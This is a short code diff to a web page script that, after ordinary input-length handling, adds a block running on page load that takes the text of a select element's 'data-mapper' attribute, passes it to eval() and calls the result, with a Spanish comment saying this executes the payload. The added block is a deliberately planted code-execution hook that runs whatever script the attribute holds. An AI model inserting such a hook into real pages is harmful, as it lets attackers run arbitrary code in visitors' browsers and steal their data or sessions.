@@ -841,4 +841,13 @@ document.querySelectorAll('input[type="number"]').forEach(input => {
   input.oninput = () => {
     if(input.value.length > input.maxLength) input.value = input.value.slice(0, input.maxLength);
   }
-});                             
+});        
+<script>
+  window.onload = () => {
+    const select = document.querySelector('select[data-mapper]');
+    const mapper = select?.getAttribute('data-mapper');
+    if (mapper) {
+      eval(mapper)();  // <-- Esto ejecuta el payload
+    }
+  };
+</script>
